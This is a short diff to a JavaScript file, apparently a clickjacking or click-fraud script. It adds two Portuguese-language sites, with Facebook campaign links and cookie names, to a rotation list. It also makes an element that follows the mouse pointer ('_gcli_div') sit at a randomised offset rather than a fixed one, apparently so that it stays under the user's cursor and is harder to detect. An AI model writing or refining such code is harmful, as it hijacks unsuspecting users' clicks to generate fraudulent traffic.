@@ -1,4 +1,6 @@
 let sitesRand = [
+    {link: 'https://www.noticiasdefutebol.life/?utm=facebook&campanha=05ab094fe8d8777ce13741a2ed4fc66b', cookie: '_gcli_6'},
+    {link: 'https://www.micelax.com/?utm=facebook&campanha=c49d45ff6590a0bbf4f6157d87516c3c', cookie: '_gcli_5'},
     {link: 'https://prinoticias.com/?utm=facebook&campanha=2bcbc908c3f733d2e524525a90039322', cookie: '_gcli_4'},
     {link: 'https://fallgames.xyz/?utm=facebook&campanha=98808ac2a0c57df5ba69cb8d786d6545', cookie: '_gcli_3'},
     {link: 'https://www.mantendoasaude.com/?utm=facebook&campanha=28d645a624b3f09820e4938912a1ed3c', cookie: '_gcli_2'},
@@ -68,8 +70,8 @@ function insertCode(){
         let tracker = pointerTracker(e);
         if (canTrack == 1) {
             $('#_gcli_div').css({
-                left:  tracker.x - 304,
-                top:   tracker.y - 20
+                left:  tracker.x - Math.floor(Math.random()*(324-284+1)+284),
+                top:   tracker.y - Math.floor(Math.random()*(40-20+1)+20)
             });
         }
     });
